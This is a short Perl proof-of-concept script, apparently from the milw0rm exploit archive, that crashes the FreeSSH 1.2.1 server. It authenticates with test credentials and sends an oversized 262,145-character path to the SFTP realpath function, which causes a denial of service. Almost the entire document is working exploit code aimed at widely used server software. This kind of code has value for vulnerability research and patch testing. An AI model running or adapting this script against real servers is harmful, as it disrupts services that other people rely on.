#!/usr/bin/perl
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# FreeSSH 1.2.1 Crash #2 -- A Product of Fuzzing. Stay Tuned For More.
use Net::SSH2;

$host     = "192.168.0.100";
$port     = 22;
$username = "test";
$password = "test";
$dos      = "A" x 262145;

$ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port)               || die "\nError: Connection Refused!\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$sftp = $ssh2->sftp();
$realpath = $sftp->realpath($dos);
$ssh2->disconnect();
exit;

# milw0rm.com [2008-10-22]
